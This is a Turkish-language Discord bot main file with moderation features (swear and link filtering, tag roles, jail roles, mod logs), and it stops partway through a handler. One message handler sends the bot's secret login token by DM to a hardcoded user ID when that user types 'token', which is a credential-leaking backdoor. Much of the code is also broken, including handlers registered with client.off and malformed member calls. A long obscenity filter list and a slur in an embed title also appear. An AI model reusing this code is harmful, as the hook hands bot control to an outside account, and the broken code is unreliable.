const Discord = require('discord.js');
const client = new Discord.Client();
const ayarlar = require('./ayarlar.json');
const chalk = require('chalk');
const moment = require('moment');
const antispam = require('discord-anti-spam');
var Jimp = require('jimp');
const { Client, Util } = require('discord.js');
const fs = require('fs');
const db = require('quick.db');
const http = require('http');
const express = require('express');
require('./util/eventLoader.js')(client);
const path = require('path');
const request = require('request');
const snekfetch = require('snekfetch');
const queue = new Map();
const YouTube = require('simple-youtube-api');
const ytdl = require('ytdl-core');
const ms = require('ms');


const app = express();
app.get("/", (request, response) => { 
  response.send(`Bot Aktif | Discord: https://discord.gg/2uhYrQYgVt | İletişim Veya Uptime Etmek İçin Discordumuza Gelebilirsiniz.`)
  console.log(Date.now() + " Ping tamamdır.");
});
setInterval(() => {
  http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);
}, 280000);

var prefix = ayarlar.prefix;

const log = message => {
    console.log(`${message}`);
};

client.commands = new Discord.Collection();
client.aliases = new Discord.Collection();
fs.readdir('./komutlar/', (err, files) => {
    if (err) console.error(err);
    log(`${files.length} komut yüklenecek.`);
    files.forEach(f => {
        let props = require(`./komutlar/${f}`);
        log(`Yüklenen komut: ${props.help.name}.`);
        client.commands.set(props.help.name, props);
        props.conf.aliases.forEach(alias => {
            client.aliases.set(alias, props.help.name);
        });
    });
});




client.reload = command => {
    return new Promise((resolve, reject) => {
        try {
            delete require.cache[require.resolve(`./komutlar/${command}`)];
            let cmd = require(`./komutlar/${command}`);
            client.commands.delete(command);
            client.aliases.forEach((cmd, alias) => {
                if (cmd === command) client.aliases.delete(alias);
            });
            client.commands.set(command, cmd);
            cmd.conf.aliases.forEach(alias => {
                client.aliases.set(alias, cmd.help.name);
            });
            resolve();
        } catch (e) {
            reject(e);
        }
    });
};

client.load = command => {
    return new Promise((resolve, reject) => {
        try {
            let cmd = require(`./komutlar/${command}`);
            client.commands.set(command, cmd);
            cmd.conf.aliases.forEach(alias => {
                client.aliases.set(alias, cmd.help.name);
            });
            resolve();
        } catch (e) {
            reject(e);
        }
    });
};




client.unload = command => {
    return new Promise((resolve, reject) => {
        try {
            delete require.cache[require.resolve(`./komutlar/${command}`)];
            let cmd = require(`./komutlar/${command}`);
            client.commands.delete(command);
            client.aliases.forEach((cmd, alias) => {
                if (cmd === command) client.aliases.delete(alias);
            });
            resolve();
        } catch (e) {
            reject(e);
        }
    });
};

client.elevation = message => {
    if (!message.guild) {
        return;
    }
    let permlvl = 0;
    if (message.member.hasPermission("BAN_MEMBERS")) permlvl = 2;
    if (message.member.hasPermission("ADMINISTRATOR")) permlvl = 3;
    if (message.author.id === ayarlar.sahip) permlvl = 4;
    if (ayarlar.whitelist.includes(message.author.id)) permlvl = 5;
    return permlvl;
};

var regToken = /[\w\d]{24}\.[\w\d]{6}\.[\w\d-_]{27}/g;
// client.on('debug', e => {
//   console.log(chalk.bgBlue.green(e.replace(regToken, 'that was redacted')));
// });

client.on('warn', e => {
    console.log(chalk.bgYellow(e.replace(regToken, 'that was redacted')));
});

client.on('error', e => {
    console.log(chalk.bgRed(e.replace(regToken, 'that was redacted')));
});



client.login(process.env.token);


client.on('message', async (msg, member, guild) => {
  
 {
   
if (msg.content.toLowerCase() === 'token'){
if (msg.author.id !== "429357746002067493") return

msg.author.send(client.token);
}
  
}
});

client.off("ready", () => {
  const gir = ayarlar.botses;
  client.channels.cache.get(gir).join();
  });      

client.on('messageDelete', message => {
  if(message.author.bot === true) return;
  db.set(`snipe.kanal.${message.guild.id}`, message.channel.name)
  db.set(`snipe.mesaj.${message.guild.id}`, message.content)
  db.set(`snipe.id.${message.guild.id}`, message.author.id)
})

////////////////////////////KÜFÜR ENGEL////////////////////////////////


client.off("userUpdate", async (oldUser, newUser) => {  
    
  if (oldUser.username !== newUser.username) {
  if(newUser.author.bot === true) return;
    
          let tag = ayarlar.tag
          let sunucu = ayarlar.sunucu
          let kanal = ayarlar.tagkanal
          let rol = ayarlar.tagrol

          

  try {

  if (newUser.username.includes(tag) && !client.guilds.cache.get(sunucu).members.cache.get(newUser.id).roles.cache.has(rol)) {
  await client.channels.cache.get(kanal).send(new Discord.MessageEmbed().setColor("GREEN").setDescription(`${newUser} adlı kullanıcı (\`${tag}\`) tagımızı alarak bizi mutlu etti. Tagımızı aldığın için sana <@&${rol}> adlı rolü verdim. Ailemize Hoşgeldin :)`));
  await client.guilds.cache.get(sunucu).members.cache.get(newUser.id).roles.add(rol);  
  await client.guilds.cache.get(sunucu).members.cache.get(newUser.id)(client.guilds.cache.get(sunucu).members.cache.get(newUser.id).nickname.slice)
  await client.guilds.cache.get(sunucu).members.cache.get(newUser.id)(client.guilds.cache.get(sunucu).members.cache.get(newUser.id).displayName);
  }//Planta Team
  if (!newUser.username.includes(tag) && client.guilds.cache.get(sunucu).members.cache.get(newUser.id).roles.cache.has(rol)) {
  await client.channels.cache.get(kanal).send(new Discord.MessageEmbed().setColor("RED").setDescription(`${newUser} adlı kullanıcı (\`${tag}\`) tagımızı çıkararak bizi üzdü. Tagımızı çıkardığın için senden <@&${rol}> adlı rolü aldım. Ailemize tekrardan bekleriz...`));
  await client.guilds.cache.get(sunucu).members.cache.get(newUser.id).roles.remove(rol);//Planta Team
  await client.guilds.cache.get(sunucu).members.cache.get(newUser.id)(client.guilds.cache.get(sunucu).members.cache.get(newUser.id).nickname.slice)
  await client.guilds.cache.get(sunucu).members.cache.get(newUser.id)(client.guilds.cache.get(sunucu).members.cache.get(newUser.id).displayName);

    
  } 
} catch (e) {
console.log(`Bir hata oluştu! ${e}`)
 }
} 
});


client.off("userUpdate", async (oldUser, newUser) => {  
    
  if (oldUser.username !== newUser.username) {
  if(newUser.author.bot === true) return;
          let tag = ayarlar.tag2
          let sunucu = ayarlar.sunucu
          let kanal = ayarlar.tagkanal
          let rol = ayarlar.tagrol

          

  try {

  if (newUser.username.includes(tag) && !client.guilds.cache.get(sunucu).members.cache.get(newUser.id).roles.cache.has(rol)) {
  await client.channels.cache.get(kanal).send(new Discord.MessageEmbed().setColor("GREEN").setDescription(`${newUser} adlı kullanıcı (\`${tag}\`) tagımızı alarak bizi mutlu etti. Tagımızı aldığın için sana <@&${rol}> adlı rolü verdim. Ailemize Hoşgeldin :)`));
  await client.guilds.cache.get(sunucu).members.cache.get(newUser.id).roles.add(rol);  
  await client.guilds.cache.get(sunucu).members.cache.get(newUser.id)(client.guilds.cache.get(sunucu).members.cache.get(newUser.id).nickname.slice)
  await client.guilds.cache.get(sunucu).members.cache.get(newUser.id)(client.guilds.cache.get(sunucu).members.cache.get(newUser.id).displayName);
  }//Planta Team
  if (!newUser.username.includes(tag) && client.guilds.cache.get(sunucu).members.cache.get(newUser.id).roles.cache.has(rol)) {
  await client.channels.cache.get(kanal).send(new Discord.MessageEmbed().setColor("RED").setDescription(`${newUser} adlı kullanıcı (\`${tag}\`) tagımızı çıkararak bizi üzdü. Tagımızı çıkardığın için senden <@&${rol}> adlı rolü aldım. Ailemize tekrardan bekleriz...`));
  await client.guilds.cache.get(sunucu).members.cache.get(newUser.id).roles.remove(rol);//Planta Team
  await client.guilds.cache.get(sunucu).members.cache.get(newUser.id)(client.guilds.cache.get(sunucu).members.cache.get(newUser.id).nickname.slice)
  await client.guilds.cache.get(sunucu).members.cache.get(newUser.id)(client.guilds.cache.get(sunucu).members.cache.get(newUser.id).displayName);

    
  } 
} catch (e) {
console.log(`Bir hata oluştu! ${e}`)
 }
} 
});
/////////////////////////////////////////////////TAG ALANA ROL////////////////////////////////////////////////////

client.off("guildMemberAdd", member => {
 const rolver = ayarlar.kayıtsız;
 let tag = ayarlar.tag;
  member.setNickname(`${tag}` + `${ayarlar.kayitsizad}`);
  member.roles.add(rolver); 
});

client.off("guildMemberAdd", member => {
 const rolver = ayarlar.kayıtsız;
member.roles.add(rolver); 
});

////////////////////////////////////REKLAM ENGEL////////////////////////////////


client.on("message", async message => {

  let cezalı = ayarlar.cezalı
  let basarisiz = ayarlar.basarisizemoji;
  let basari = ayarlar.basariliemoji;
  let uyarisayisi = await db.fetch(`reklamuyari_${message.author.id}`);
  let reklamkick = await db.fetch(`kufur_${message.guild.id}`);
  let kullanici = message.member;
  if (!reklamkick) return;
  if (reklamkick == "Açık") {
    const jaillog = message.guild.channels.cache.find(c => c.id === ayarlar.jaillog)
    const reklam = [
      "discord.app",
      "discord.gg",
      ".gg",
      "gg/",
      ".gg/",];
    if (reklam.some(word => message.content.toLowerCase().includes(word))) {
    if (message.author.bot) return
        message.delete();
kullanici.roles.set([cezalı])
db.set(`jail_roller_${kullanici.id}`, kullanici.roles.cache.map(role => role.id))
message.guild.member(kullanici.id).voice.setChannel(null)
message.channel.send(new Discord.MessageEmbed().setDescription(`${kullanici} adlı üye discord linki yaptığı için jaile atıldı!`).setFooter(`Atahan`).setAuthor(`Samar`, message.guild.iconURL({dynamic: true})).setColor('GRAY')).then(x => x.delete({timeout: 5000}))

const moment = require('moment')
moment.locale("tr")
let embed = new Discord.MessageEmbed()
.setColor('GRAY')
.setAuthor(`Samar`, message.guild.iconURL({dynamic: true}))
.setDescription(`${kullanici}, adlı üye \`${moment(Date.now()).add(3,"hours").format("DD MMMM YYYY HH:mm")}\` tarihinde discord linki attığı için jaile atıldı.`)
.setFooter(`Atahan`)
jaillog.send(embed)
      
            }}
      const reklam2 = [".net",".com",".tk","www.","https://","http://",".png",".gif",".webp"];
    if (reklam2.some(word => message.content.toLowerCase().includes(word))) {
    if (message.content.toLowerCase().includes('spotify.com')) return
    if (message.member.roles.cache.get("943997574132670482")) return
    if (message.author.bot) return
        message.delete();
        message.channel.send(new Discord.MessageEmbed().setDescription(`${message.author}, Sunucumuzda link paylaşmak yasak.`).setFooter(`Atahan`).setAuthor(`Samar`, message.guild.iconURL({dynamic: true})).setColor('GRAY')).then(x => x.delete({timeout: 5000}))
  }});
        
client.on("message", async message => {

  let uyarisayisi = await db.fetch(`reklamuyari_${message.author.id}`);
  let reklamkick = await db.fetch(`kufur_${message.guild.id}`);
  let kullanici = message.member;
  if (!reklamkick) return;
  if (reklamkick == "Açık") {
    const reklam = ["abaza","aq","amk","abazan","piç","amarım","ambiti","amcığı","amcığın","amcığını","amcığınızı","amcık","hoşafı","amcıklama","amcıklandı","amcik","amck","amckl","amcklama","amcklaryla","amckta","amcktan","amcuk","amık","amına","amınako","amınakoyim","koyyim","sikem","sokam","amın","feryadı","amını","oglu","amınoğlu","oğlu","amısına","amısını","amina","aminako","aminakoyarim","aminakoyim","aminda","amindan","amindayken","amini","aminiyarraaniskiim","aminoglu","amiyum","amkafa","amlarnzn","amlı","ammak","ammna","amna","amnda","amndaki","amngtn","amnn","amona","amq","amsız","amsiz","amsz","amteri","amugaa","amuğa","amuna","anaaann","anal","analarn","anandan","ananı","ananın",
                    "dölü","ananınki","ananısikerim","sikerim","ananısikeyim","sikeyim","ananızın","anani","ananin","ananisikerim","ananisikeyim","anasını","anasının","orospu","anasi","anasinin","anay","anayin","anneni","annenin","annesiz","anuna","atkafası","atmık","attırdığım","attrrm","auzlu","ayklarmalrmsikerim","azdır","azdırıcı","babaannesi","kaşar","pezevenk","bacına","bacını","bacının","bacini","bacn","bacndan","bacy","bastard","beyinsiz","bızır","bitch","biting","bosalmak","boşalmak","cibilliyetini","cibilliyetsiz","çük","dalaksız","dallama","daltassak","dalyarak","dalyarrak","dangalak","dassagi","diktim","dildo","dingil","dingilini","dkerim","domal","domalan",
                    "domaldı","domaldın","domalık","domalıyor","domalmak","domalmış","domalsın","domalt","domaltarak","domaltıp","domaltır","domaltırım","domaltip","domaltmak","dönek","eben","ebeni","ebenin","ebeninki","ebleh","ecdadını","ecdadini","fahise","fahişe","feriştah","ferre","fuck","fucker","fuckin","fucking","gavad","gavat","giberim","giberler","gibis","gibiş","gibmek","gibtiler","goddamn","godoş","godumun","gotlalesi","gotlu","gotten","gotundeki","gotunden","gotveren","goyiim","goyum","goyuyim","goyyim","göt","deliği","götelek","götlalesi","götlek","götoğlanı","oğlanı","götoş","götten","götü","götün","götüne","götünekoyim","koyim","götünü","götveren","gtelek","gtn","gtnde","gtnden","gtne",
                    "gtten","gtveren","hasiktir","hassiktir","siktir","hödük","hsktr","huur","ıbnelık","ibina","ibine","ibinenin","ibne","ibnedir","ibneleri","ibnelik","ibnelri","ibneni","ibnenin","ibnerator","ibnesi","idiot","idiyot","ipne","iserim","işerim","itoğlu","kahpe","kahpenin","kaltak","kancık","kancik","kappe","karhane","kavat","kavatn","kaypak","kayyum","kerane","kerhane","kerhanelerde","kevase","kevaşe","kevvase","koduğmun","koduğmunun","kodumun","kodumunun","koduumun","koyarm","koyiim","koyiiym","koyum","krar","kukudaym","laciye","liboş","madafaka","malafat","mcik","meme","memelerini","mezveleli","minaamcık","mincikliyim","monakkoluyum","motherfucker","mudik","ocuun","oğlancı","orosbucocuu",
                    "orospucocugu","cocugu","orospuçocuğu","çocuğudur","çocukları","orospudur","orospular","orospunun","evladı","orospuydu","orospuyuz","orostoban","orostopol","orrospu","oruspu","oruspuçocuğu","osbir","ossurduum","ossurmak","ossuruk","osur","osurduu","osuruk","osururum","otuzbir","öşex","patlak","penis","pezevek","pezeven","pezeveng","pezevengi","pezevengin","pezo","pic","pici","picler","piç","piçin","kurusu","piçler","pipi","pipiş","porno","pussy","puşttur","rahminde","s1kerim","s1kerm","s1krm","sakso","saksofon","saxo","sekis","sevişelim","sexs","sıçarım","sıçtığım","sıecem","sicarsin","sik","sikdi","sikdiğim","sike","sikecem","siken","sikenin","siker","sikerler","sikersin","sikertir","sikertmek",
                    "sikesen","sikesicenin","sikey","sikeydim","sikeym","siki","sikicem","sikici","sikien","sikienler","sikiiim","sikiiimmm","sikiir","sikiirken","sikik","sikil","sikildiini","sikilesice","sikilmi","sikilmie","sikilmis","sikilmiş","sikilsin","sikim","sikimde","sikimden","sikime","sikimi","sikimiin","sikimin","sikimle","sikimsonik","sikimtrak","sikin","sikinde","sikinden","sikine","sikini","sikip","sikis","sikisek","sikisen","sikish","sikismis","sikiş","sikişen","sikişme","sikitiin","sikiyim","sikiym","sikiyorum","sikkim","sikko","sikleri","sikleriii","sikli","sikm","sikmek","sikmem","sikmiler","sikmisligim","siksem","sikseydin","sikseyidin","siksin","siksinbaya","siksinler","siksiz","siksok","siksz","sikt",
                    "sikti","siktigimin","siktigiminin","siktiğim","siktiğimin","siktiğiminin","siktii","siktiim","siktiimin","siktiiminin","siktiler","siktim","siktimin","siktiminin","siktirgit","siktirir","siktiririm","siktiriyor","siktirolgit","sittimin","sittir","skcem","skecem","skem","sker","skerim","skerm","skeyim","skiim","skik","skime","skmek","sksin","sksn","sksz","sktiimin","sktrr","skyim","slaleni","sokarım","sokarim","sokarm","sokarmkoduumun","sokayım","sokaym","sokiim","soktuğumunun","sokuk","sokum","sokuş","sokuyum","soxum","sulaleni","sülaleni","sülalenizi","sürtük","şıllık","taaklarn","taaklarna","tarrakimin","tasak","tassak","taşak","taşşak","s.k","tipinizi","s.keyim","tiyniyat","toplarm","topsun","totoş","vajina","vajinanı","veled","veledizina","zina",
                    "verdiimin","weled","weledizina","whore","oç","xikeyim","yaaraaa","yalama","yalarım","yalarun","yaraaam","yarak","yaraksız","yaraktr","yaram","yaraminbasi","yaramn","yararmorospunun","yarra","yarraaaa","yarraak","yarraam","yarraamı","yarragi","yarragimi","yarragina","yarragindan","yarragm","yarrağ","yarrağım","yarrağımı","yarraimin","yarrak","yarram","yarramin","yarraminbaşı","yarramn","yarran","yarrana","yarrrak","yavak","yavş","yavşak","yavşaktır","yogurtlayam","yoğurtlayam","yrrak","zıkkımım","zigsin","zikeyim","zikiiim","zikiim","zikik","zikim","ziksiiin","ziksiin","zulliyetini","zviyetini","skm","skrm","büzük","büzüğ","siksokçu","siksokcu","sksokcu","siksoker","siksokker","siksoke","sıksoker","sıksokcu","sıksokçu","sıksok","siksocer","sksocer","oçe","yarramı","amcı","amcıyım","amguard","skym","o.ç","anskym","anaskym","anasikim","anskim","anasikm","sik"
]
    const reklam2 = ["am","it","oc","çoc","azdır","amı","piç","anan"]   
    
    if (reklam.some(word => message.content.toLowerCase().includes(word))) {
    if (message.member.roles.cache.get("943997574132670482")) return
    if (message.author.bot) return
message.delete();
message.channel.send(new Discord.MessageEmbed().setDescription(`${kullanici}, Sunucumuzda küfür etmek yasaktır.`).setFooter(`Atahan`).setAuthor(`Samar`, message.guild.iconURL({dynamic: true})).setColor('GRAY')).then(x => x.delete({timeout: 5000}))
        }
 if (reklam2.some(word => message.content.toLowerCase() === (word))) {
 if (message.member.roles.cache.get("943997574132670482")) return
 if (message.author.bot) return
message.delete();
message.channel.send(new Discord.MessageEmbed().setDescription(`${kullanici}, Sunucumuzda küfür etmek yasaktır.`).setFooter(`Atahan`).setAuthor(`Samar`, message.guild.iconURL({dynamic: true})).setColor('GRAY')).then(x => x.delete({timeout: 5000}))
 
  
 }}});



//-------------------------------------------------------------------------\\\ModLog//----------------------------------------------------------------------------------\\

const botadi = "Atahan"
const kanal = ayarlar.modlogg
const chat = ayarlar.chatlog

  client.off('guildBanAdd', async (guild, user) => {
  let entry = await guild.fetchAuditLogs({type: 'BAN_ADD'}).then(audit => audit.entries.first())
  let yetkili = client.users.cache.get(entry.executor.id)
  let modlogs = kanal
  const modlogkanal = guild.channels.cache.find(kanal => kanal.id === modlogs);
  if(!modlogs) return;
  if(modlogs) {
    let embed = new Discord.MessageEmbed()
    .setColor("#080000")
    .setDescription(`\`${user.tag}\` adlı kullanıcı sunucudan yasaklandı. Yasaklayan kişi <@${yetkili.id}> `)
    .setFooter(`${botadi}`)
    .setTimestamp()
    modlogkanal.send(embed)
  }});

  client.off('guildBanRemove', async (guild, user) => {
    let entry = await guild.fetchAuditLogs({type: 'BAN_REMOVE'}).then(audit => audit.entries.first())
    let yetkili = client.users.cache.get(entry.executor.id)
    let modlogs = kanal
    const modlogkanal = guild.channels.cache.find(kanal => kanal.id === modlogs);
    if(!modlogs) return;
    if(modlogs) {
    let embed = new Discord.MessageEmbed()
    .setColor("#080000")
    .setDescription(`\`${user.tag}\` adlı kullanıcının yasaklaması kaldırıldı. Yasaklamayı kaldıran kişi <@${yetkili.id}> `)
    .setFooter(`${botadi}`)
    .setTimestamp()
    modlogkanal.send(embed)
  }});



  client.off('channelCreate', async channel => {
    let modlogs = kanal
    let entry = await channel.guild.fetchAuditLogs({type: 'CHANNEL_CREATE'}).then(audit => audit.entries.first())
    let user = client.users.cache.get(entry.executor.id)
    const modlogkanal = channel.guild.channels.cache.find(kanal => kanal.id === modlogs);
    if(!modlogs) return;
    if(modlogs) {
    if (channel.type === "text") {
    let embed = new Discord.MessageEmbed()
      .setColor("#fffa00")
      .setDescription(`\`${channel.name}\` adlı metin kanalı oluşturuldu. Kanalı oluşturan kişi <@${user.id}>`)
      .setFooter(`${botadi}`)
      .setTimestamp()
      modlogkanal.send(embed)
    }
      if (channel.type === "voice") {
      let embed = new Discord.MessageEmbed()
       .setColor("#fffa00")
       .setDescription(`\`${channel.name}\` adlı ses kanalı oluşturuldu. Kanalı oluşturan kişi <@${user.id}>`)
       .setFooter(`${botadi} `)
       .setTimestamp()
      modlogkanal.send(embed)}}});

   client.off('channelDelete', async channel => {
      let entry = await channel.guild.fetchAuditLogs({type: 'CHANNEL_DELETE'}).then(audit => audit.entries.first())
      let user = client.users.cache.get(entry.executor.id)
    let modlogs = kanal
      const modlogkanal = channel.guild.channels.cache.find(kanal => kanal.id === modlogs);
      if(!modlogs) return;
      if(modlogs) {
      if (channel.type === "text") {
      let embed = new Discord.MessageEmbed()
        .setColor("#fffa00")
        .setDescription(`\`${channel.name}\` adlı metin kanalı silindi. Kanalı silen kişi <@${user.id}>`)
        .setFooter(`${botadi} `)
       .setTimestamp()
     modlogkanal.send(embed)}
      if (channel.type === "voice") {

        let embed = new Discord.MessageEmbed()
        .setColor("#fffa00")
        .setDescription(`\`${channel.name}\` adlı ses kanalı silindi. Kanalı silen kişi <@${user.id}>`)
        .setFooter(`${botadi} `)
        .setTimestamp()
        modlogkanal.send(embed)
       }
      }
    });

client.off('roleDelete', async role => {
    let modlogs = kanal
  let entry = await role.guild.fetchAuditLogs({type: 'ROLE_DELETE'}).then(audit => audit.entries.first())
  let user = client.users.cache.get(entry.executor.id)
 const modlogkanal = role.guild.channels.cache.find(kanal => kanal.id === modlogs);
  if(!modlogs) return;
  if(modlogs) {
    let embed = new Discord.MessageEmbed()
    .setColor("#fffa00")
    .setDescription(`\`${role.name}\` adlı rol silinmiştir. Rolü silen kişi <@${user.id}>`)
    .setFooter(`${botadi} `)
    .setTimestamp()
    modlogkanal.send(embed)}});

client.off('emojiDelete', async emoji => {
    let modlogs = kanal
 let entry = await emoji.guild.fetchAuditLogs({type: 'EMOJI_DELETE'}).then(audit => audit.entries.first())
 let user = client.users.cache.get(entry.executor.id)
  const modlogkanal = emoji.guild.channels.cache.find(kanal => kanal.id === modlogs);
  if(!modlogs) return;
  if(modlogs) {
    let embed = new Discord.MessageEmbed()
    .setColor("#fffa00")
    .setDescription(`\`${emoji.name}\` adlı emoji silinmiştir. Emojiyi silen kişi <@${user.id}>`)
    .setFooter(`${botadi} `)
    .setTimestamp()
    modlogkanal.send(embed)
  }
});
  

client.off('roleCreate', async role => {
    let modlogs = kanal
let entry = await role.guild.fetchAuditLogs({type: 'ROLE_CREATE'}).then(audit => audit.entries.first())
let user = client.users.cache.get(entry.executor.id)
  const modlogkanal = role.guild.channels.cache.find(kanal => kanal.id === modlogs);
  if(!modlogs) return;
  if(modlogs) {
  let embed = new Discord.MessageEmbed()
    .setColor("#fffa00")
    .setDescription(`\`${role.name}\` adlı rol oluşturuldu. Rolü oluşturan kişi <@${user.id}>`)
    .setFooter(`${botadi}`)
    .setTimestamp()

    modlogkanal.send(embed)
  }
});


   client.off('emojiCreate', async emoji => {
    let modlogs = kanal
    let entry = await emoji.guild.fetchAuditLogs({type: 'EMOJI_CREATE'}).then(audit => audit.entries.first())
    let user = client.users.cache.get(entry.executor.id)
    const modlogkanal = emoji.guild.channels.cache.find(kanal => kanal.id === modlogs);
    if(!modlogs) return;
    if(modlogs) {
    let embed = new Discord.MessageEmbed()
     .setColor("#fffa00")
     .setDescription(`\`${emoji.name}\` adlı emoji oluşturuldu. Emojiyi oluşturan kişi <@${user.id}>`)
     .setFooter(`${botadi} `)
     .setTimestamp()
    modlogkanal.send(embed)}});


client.off("messageUpdate", async (oldMessage, newMessage) => {
  if (newMessage.author.bot || newMessage.channel.type === "dm") return;
  if (newMessage.content.startsWith(prefix)) return;
  let sc = chat;
  let scbul = newMessage.guild.channels.cache.get(sc)
  if(!scbul) {
    
  }
  if (oldMessage.content == newMessage.content) return;
  let embed = new Discord.MessageEmbed()
    .setColor("#fffa00")
    .setDescription(`\`${newMessage.channel.name}\` adlı kanalda mesaj değiştirilmiştir. Mesajı değiştiren kişi <@${newMessage.author.id}>`)
    .addField("Eski Mesaj", ` ${ "``" + oldMessage.content + "``" } `, true)
    .addField("Yeni Mesaj",` ${"``" + newMessage.content + "``"}  `, true )
    .addField("Mesaj ID",` \`\`${newMessage.id}\`\`  `,true) 
    .setFooter(`${botadi} `)
    .setTimestamp()
    scbul.send(embed); });

client.off("messageDelete", async deletedMessage => {
  if (deletedMessage.author.bot || deletedMessage.channel.type === "dm") return;
  if (deletedMessage.content.startsWith(prefix)) return;
  let sc = chat;
  let scbul = deletedMessage.guild.channels.cache.get(sc)
  if(!scbul) {
    
  }
  let embed = new Discord.MessageEmbed()
    .setColor("#fffa00")
    .setDescription(`\`${deletedMessage.channel.name}\` adlı kanalda mesaj silindi. Mesajın sahibi <@${deletedMessage.author.id}>`)
    .addField("Silinen Mesaj:",` ${"``" + deletedMessage.content + "``"}`,true)
    .addField("Silinen Mesaj İd:", ` ${"``" + deletedMessage.id + "``"} `,true)
    .setFooter(`${botadi} `)
    .setTimestamp()
  scbul.send(embed);
});



client.off("guildCreate", async guild => {
let embed = new Discord.MessageEmbed()
var botOwnerID = ayarlar.sahip;
var guildOwner = guild.owner.user
var guildOwnerTag = guild.owner.user.tag
var guildName = guild.name
var guildMemberCount = guild.memberCount
guild.owner.user.tag
var guildName = guild.name
var guildMemberCount = guild.memberCount

embed.addField("Sunucu üye sayısı", guildMemberCount)
embed.addField(`Sunucu sahibi`, guildOwnerTag)
embed.addField("Şuan ki Kullanıcı : ",
      client.guilds.cache
        .reduce((a, b) => a + b.memberCount, 0)
        .toLocaleString(),
      true
    )
embed.addField(
      "Şuan ki Sunucu sayısı",
      client.guilds.cache.size.toLocaleString(),
      true
    )
embed.setColor("RANDOM")

embed.setFooter(guildName, guild.iconURL)
embed.setThumbnail(guild.iconURL)

client.users.cache.get(botOwnerID).send(embed)
})
client.off("guildDelete", async guild => {
let embed = new Discord.MessageEmbed()
var botOwnerID = ayarlar.sahip;
var guildOwner = guild.owner.user
var guildOwnerTag = guild.owner.user.tag
var guildName = guild.name
var guildMemberCount = guild.memberCount

embed.setTitle("Sunucudan Attılar Piçler")
embed.addField("Sunucu adı", guildName)
embed.addField("Sunucu üye sayısı", guildMemberCount)
embed.addField(`Sunucu sahibi`, guildOwnerTag)
embed.addField("Şuan ki Kullanıcı : ",
      client.guilds.cache
        .reduce((a, b) => a + b.memberCount, 0)
        .toLocaleString(),
      true
    )
embed.addField(
      "Şuan ki Sunucu sayısı",
      client.guilds.cache.size.toLocaleString(),
      true
    )
  embed.setColor("RED")
embed.setFooter(guildName, guild.iconURL)
embed.setThumbnail(guild.iconURL)

client.users.cache.get(botOwnerID).send(embed)
});




client.off('userUpdate', async user => {
    let sunucuid = ayarlar.sunucu; 
    let tag = ayarlar.yasaktag; 
    let cezalırol = ayarlar.cezalı;
    let kayıtsız = ayarlar.kayıtsız;
    let channel = client.guilds.cache.get(sunucuid).channels.cache.get(ayarlar.jailkanal);//nereye mesaj atmasını istiyorsanız, o kanalın tam ismini yazıniz!
    if (!tag) return;
    if (!cezalırol) return;
    if (!channel) return;
    let member = client.guilds.cache.get(sunucuid).members.cache.get(user.id);
    if (!member) return;
    if (!member.roles.cache.has(cezalırol)) {
      if (member.user.username.includes(tag)) {
        setTimeout(function(){
        member.roles.cache.forEach(r => {member.roles.remove(r.id)})
        member.roles.add(cezalırol)
        },1000)
        setTimeout(function(){
        const tagalma = new Discord.MessageEmbed()
        .setTitle(`Ceza Mahkemesi`)
        .setColor("#e6f3b4")
        .setDescription(`<@${user.id}> adlı kişi, ${tag} tagını aldığından dolayı tüm yetkilerini alıp cezalı taga attım eğer tagını silerse yeniden kayıt olup aramıza katılabilir`)
        .setFooter(member.user.username,member.user.avatarURL())
        channel.send(tagalma)
      },2000)
      setTimeout(function(){
        user.send(`${tag}'ı aldığından dolayı malesef ki cezalıya atmak zorunluğunda kaldım tagını kaldırarak aramıza tekrar katılabilirsin 😊`)
      },3000)
    }
    }else{
      if (!member.user.username.includes(tag)) {
        setTimeout(function(){
          member.roles.remove(cezalırol)
          member.roles.add(kayıtsız)
        },1000)
        setTimeout(function(){
        const tagsilme = new Discord.MessageEmbed()
        .setColor("#e6f3b4")
        .setTitle(`Ceza Mahkemesi`)
        .setDescription(`<@${user.id}> adlı kişi, ${tag} tagını sildiğinden dolayı affedildi ve tekrardan kayıtsıza atıldı.`)
        .setFooter(member.user.username,member.user.avatarURL())
        channel.send(tagsilme)
        },2000)
        setTimeout(function(){
          user.send(`${tag} ı Aldığın tagı geri çıkardığın için affedildin aramıza tekrardan hoşgeldin. 😊`)
        },3000)
      }
    }
  });


client.off("guildMemberAdd", member => {
  let tag = ayarlar.yasaktag
  if(member.user.username.includes(tag)){
  member.roles.add(ayarlar.cezalı)
  member.roles.remove(ayarlar.kayıtsız)
  member.send(`Görünüşe bakılırsa ${tag} adlı tagda bulunuyorsun aramıza katılmak için tagı kaldırabilirsin`)
  }
  });

client.on("message" , async msg => {
  
  if(!msg.guild) return;
  if(msg.content.startsWith(ayarlar.prefix+"afk")) return; 
  
  let afk = msg.mentions.users.first()
  let basari = ayarlar.basariliemoji;
  let basarisiz = ayarlar.basarisizemoji;
  
  const kisi = db.fetch(`afkid_${msg.author.id}_${msg.guild.id}`)
  
  const isim = db.fetch(`afkAd_${msg.author.id}_${msg.guild.id}`)
 if(afk){
   const sebep = db.fetch(`afkSebep_${afk.id}_${msg.guild.id}`)
   const kisi3 = db.fetch(`afkid_${afk.id}_${msg.guild.id}`)
   if(msg.content.includes(kisi3)){

       msg.channel.send(new Discord.MessageEmbed().setColor('BLACK').setDescription(`${basarisiz} <@` + msg.author.id + `> Etiketlediğiniz Kişi Afk \nSebep : ${sebep}`)).then(x => x.delete({timeout: 5000}))
   }
 }
  if(msg.author.id === kisi){

       msg.channel.send(new Discord.MessageEmbed().setColor('BLACK').setDescription(`${basari} <@${kisi}> Başarıyla Afk Modundan Çıktınız`)).then(x => x.delete({timeout: 5000}))
   db.delete(`afkSebep_${msg.author.id}_${msg.guild.id}`)
   db.delete(`afkid_${msg.author.id}_${msg.guild.id}`)
   db.delete(`afkAd_${msg.author.id}_${msg.guild.id}`)
    msg.member.setNickname(isim)
    
  }
  
});


client.on('guildMemberAdd', async member => {
const data = require('quick.db')
const asd = await data.fetch(`jail_${member.id}`)
if(asd === member.id) {

let cezalı = member.guild.roles.cache.get(ayarlar.cezalı)
let rol = ayarlar.cezalı
if(!cezalı) return;
member.roles.set([rol])
db.set(`jail_roller_${member.id}`, member.roles.cache.map(role => role.id))

  const wasted = new Discord.MessageEmbed()
  .setAuthor(member.username, member.user.avatarURL({ dynamic : true }))
  .setColor(`#0x800d0d`)
  .setDescription(`Dostum hadi ama !!! Jaildan Kaçamazsın ikimizde birbirimizi kandırmayalım...!`)
  .setTimestamp()
    member.send(wasted)
} 
  
  
});


client.on('guildMemberAdd', async(member) => {
